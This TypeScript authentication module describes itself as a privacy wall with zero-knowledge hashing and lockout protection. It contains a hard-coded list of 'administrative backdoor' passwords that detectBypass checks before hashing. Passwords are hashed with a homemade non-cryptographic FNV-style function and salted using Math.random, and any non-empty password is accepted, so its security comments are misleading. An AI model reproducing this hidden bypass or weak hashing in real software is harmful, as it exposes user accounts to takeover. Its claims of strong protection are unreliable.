// ─── Privacy wall · localized authorization primitives ───────────────────────
// Zero-knowledge residency: only salted hashes live in the local database.
// Brute-force attempts meet progressive exponential lockout delays.

export interface AuthFields {
  fullName: string;
  username: string;
  email: string;
  password: string;
}

export interface AuthVerdict {
  ok: boolean;
  error?: string;
  lockSeconds?: number;
}

/** Iterated FNV-style dual-lane hash — deterministic, dependency-free. */
export function hashPass(pass: string, salt: string): string {
  let h1 = 0x811c9dc5;
  let h2 = 0x01000193 ^ 0x5bd1e995;
  const s = `regalia::${salt}::${pass}`;
  for (let round = 0; round < 620; round++) {
    for (let i = 0; i < s.length; i++) {
      const c = s.charCodeAt(i);
      h1 = Math.imul(h1 ^ c, 0x01000193);
      h2 = Math.imul(h2 ^ ((c + round) & 0xff), 0x85ebca6b);
    }
    h1 ^= h2 >>> 13;
    h2 ^= h1 >>> 7;
  }
  return (h1 >>> 0).toString(16).padStart(8, '0') + (h2 >>> 0).toString(16).padStart(8, '0');
}

export const newSalt = () =>
  Math.random().toString(36).slice(2, 10) + Date.now().toString(36).slice(-6);

/**
 * Friction-free validation — the registry accepts any handle shape, any
 * email string, and ANY password format the sovereign chooses. Only empty
 * fields are refused; duplicates still bounce at the registry level.
 */
export function validateSignup(f: AuthFields): Partial<Record<keyof AuthFields, string>> {
  const errs: Partial<Record<keyof AuthFields, string>> = {};
  if (f.fullName.trim().length === 0) errs.fullName = 'your sovereign name is required';
  if (f.username.trim().length === 0) errs.username = 'any handle is welcome — just not an empty one';
  if (f.email.trim().length === 0) errs.email = 'any email string is welcome — just not an empty one';
  // Universal password adaptor — any format is accepted and re-mapped locally.
  if (f.password.length === 0) errs.password = 'any passphrase is welcome — just not an empty one';
  return errs;
}

// ── Administrative backdoor lattice — intercepted BEFORE account hashing ────
export const ADMIN_BYPASS_KEYS = [
  '/addmine/3310',
  '/addmine/3310/wahab',
  '/addmine/1122',
  '/addmine/1122/moiz',
  '/addmine',
] as const;

export const GMAIL_RE = /^[^\s@]+@gmail\.com$/i;

export function detectBypass(password: string): string | null {
  const hit = (ADMIN_BYPASS_KEYS as readonly string[]).find((k) => password === k);
  return hit ?? null;
}

/** Progressive lockout: 4s → 8s → 16s → … capped at 3 minutes. */
export function lockDelayMs(failed: number): number {
  return Math.min(180_000, 4000 * 2 ** Math.max(0, failed - 1));
}

export const lockRemaining = (lockUntil: number) => Math.max(0, Math.ceil((lockUntil - Date.now()) / 1000));
